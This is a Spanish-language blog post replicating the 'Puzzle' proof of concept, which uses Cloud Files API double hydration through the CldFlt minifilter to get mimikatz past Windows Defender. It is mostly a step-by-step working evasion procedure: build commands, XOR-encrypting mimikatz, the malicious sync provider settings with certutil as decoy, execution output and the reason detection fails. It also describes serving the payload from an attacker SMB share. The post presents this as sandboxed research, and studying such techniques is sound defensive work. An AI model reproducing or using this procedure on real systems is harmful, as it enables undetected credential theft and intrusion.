---
layout: single
title: "Replicando Puzzle: evasión completa de EDR con Cloud Files y minifilters"
date: 2026-06-22
categories: [malware, tutoriales]
tags: [edr-evasion, windows-kernel, minifilter, cldflt, bindflt, cloud-files, mimikatz, flare-vm, poc]
excerpt: "Replicación del PoC de Kurosh Dabbagh (@kudaes) presentado en EuskalHack IX: doble hidratación via Cloud Files API para escribir malware en disco sin que el AV lo escanee. Mimikatz ejecutándose con Windows Defender activo."
permalink: /malware/puzzle-poc-edr-evasion-minifilters/
header:
  og_image: /assets/images/og-preview.png
---

Este post documenta la replicación del PoC [Puzzle](https://github.com/Kudaes/Puzzle) de Kurosh Dabbagh ([@kudaes](https://github.com/kudaes)), presentado en [EuskalHack IX](/conference/euskalhack-ix-minifilters-kernel/) en junio de 2026. El objetivo es entender la técnica a nivel práctico reproduciéndola en un entorno controlado (FLARE-VM con Windows Defender activo).

## Entorno

- **Sandbox:** FLARE-VM (Windows 10/11)
- **Rust:** 1.96.0 / Cargo 1.96.0
- **Windows Defender:** activo (sin exclusiones para el payload)
- **Repo:** [github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle)

Minifilters verificados con `fltmc` antes de empezar:

```
bindflt    409800   ← por encima de todo
WdFilter   328010   ← Windows Defender
CldFlt     180451   ← Cloud Files (OneDrive/sync providers)
Wof         40700
```

Los tres necesarios están presentes. La altitud de CldFlt (180451) es la clave: está **por debajo** de WdFilter, lo que significa que las escrituras que hace `CldFlt` vía `FltWriteFileEx` no son visibles para Defender.

## Compilar el PoC

```powershell
# Desde C:\Users\Ramon\Downloads\Puzzle-main\
build.cmd build release
```

Binarios generados en `.\bin\`:

```
bindlinks.exe      (200 KB) — requiere Admin
id_mapper.exe      (291 KB)
sync_provider.exe  (260 KB)
utils.exe          (220 KB)
wof_provider.exe   (226 KB) — requiere Admin
```

## Preparar el payload

El sync provider acepta el payload cifrado con XOR simple. El script `Scripts/xor_file.py` del repo hace el cifrado:

```powershell
python Scripts\xor_file.py `
  C:\Users\Ramon\Downloads\mimikatz_trunk\x64\mimikatz.exe `
  test1234 `
  C:\Temp\mimi.enc.bin
```

El archivo cifrado (`mimi.enc.bin`) son bytes XOR — sin firma PE, sin estructura reconocible. Defender no puede detectarlo.

> **Nota:** En un escenario real el atacante genera el `.enc.bin` en su propia máquina y lo sirve vía SMB (`\\attacker\share\mimi.enc.bin`). La víctima nunca tiene el binario en claro en disco.

## Ejecutar el ataque

**Paso 1 — Registrar el sync provider malicioso:**

```
.\sync_provider.exe

Sync root directory:   C:\Temp\test
Backing file 1:        C:\Windows\System32\certutil.exe
Backing file 2:        C:\Temp\mimi.enc.bin
Placeholder name:      notmimi.exe
Decryption key:        test1234
Mode:                  2
```

Output:

```
[+] Sync root sucessfully registered.
[+] Connection to sync root established. Connection key: 0x270044af320
[+] Placeholder created: C:\Temp\test\notmimi.exe
[+] Provider status set to CF_PROVIDER_STATUS_IDLE.
```

**Paso 2 — Primera ejecución (Defender escanea → certutil → limpio):**

```powershell
C:\Temp\test\notmimi.exe
```

El provider registra la hidratación:

```
[-] Fetch Data operation received:
[-] Required length: 1700864
[-] Bytes to send: 1700864          ← certutil.exe (1.7 MB)
[-] Waiting 10 seconds before second hydration...
[-] Starting second rehydration!    ← mimikatz escrito via FltWriteFileEx
[+] Process completed!
```

Lo que ocurre internamente:

1. Defender intercepta la creación de sección (`NtCreateSection`) para escanear el binario
2. `CldFlt` detecta que el placeholder está deshidratado y pide al sync provider el contenido
3. El provider entrega `certutil.exe` → Defender lo escanea → limpio ✓
4. Diez segundos después, el provider **proactivamente** hace una segunda hidratación entregando mimikatz descifrado en memoria
5. `CldFlt` escribe mimikatz a disco con `FltWriteFileEx` — esta escritura **no sube por encima de CldFlt**, por lo que WdFilter (Defender) nunca la ve
6. El USN Journal y los metadatos del MFT **no registran** esta escritura como modificación (comportamiento documentado de `FLTFL_IO_OPERATION_PAGING`)

**Paso 3 — Flush de caché y segunda ejecución:**

```powershell
# Forzar que Windows descarte el contenido cacheado
# Clic derecho → Propiedades → OK, o:
(Get-Item C:\Temp\test\notmimi.exe).Attributes
```

El Properties confirma que el contenido en disco es ya mimikatz:

{% include figure image_path="/assets/images/puzzle-poc-win.png" caption="Properties de notmimi.exe: 1.355.264 bytes = mimikatz. Defender no generó ninguna alerta." %}

Segunda ejecución:

```powershell
C:\Temp\test\notmimi.exe
```

Mimikatz se ejecuta. **Windows Defender no genera ninguna alerta.**

## Por qué funciona

```
Defender consulta en la segunda ejecución:
  → USN Journal: sin modificaciones desde el último escaneo
  → MFT metadata: sin cambios de timestamp
  → Conclusión: "el fichero no ha cambiado, ya lo aprobé" → ejecuta sin re-análisis

CldFlt escribió mimikatz sin que Defender lo viera porque:
  → FltWriteFileEx no propaga la escritura hacia instancias de altitud superior
  → WdFilter (328010) > CldFlt (180451) → Defender es "superior" → no recibe la escritura
```

## Limpieza

```powershell
# En la consola del sync_provider:
# 1 → Dehydrate
# 2 → Unsync and Exit

Remove-Item C:\Temp\test -Recurse -Force
Remove-Item C:\Temp\mimi.enc.bin
```

## Referencias

- [EuskalHack IX — Minifilters: Owning the High (and Low) Ground](/conference/euskalhack-ix-minifilters-kernel/) — notas técnicas de la charla
- [Puzzle — github.com/Kudaes/Puzzle](https://github.com/Kudaes/Puzzle) — repo de Kurosh Dabbagh
- [Cloud Filter API — Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/_cloudapi/)
- [FltWriteFileEx — Microsoft Docs](https://learn.microsoft.com/es-es/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltwritefileex)
